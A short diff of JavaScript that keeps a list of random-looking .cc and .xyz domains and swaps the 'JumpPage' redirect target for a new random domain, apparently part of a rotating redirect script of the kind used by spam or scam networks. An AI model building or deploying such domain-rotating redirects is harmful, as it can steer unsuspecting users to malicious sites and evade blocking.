@@ -40,11 +40,8 @@ var urls=[];
         urls.push(".uhvukge.cc");
         urls.push(".gzincdi.cc");
         urls.push(".rxcxaps.xyz");
-      
-        
-      
-   	
-var JumpPage="https://uiigbvp.cc";
+      	
+var JumpPage="https://diadgpuj.cc";
 
 var newestUrls = [];
 
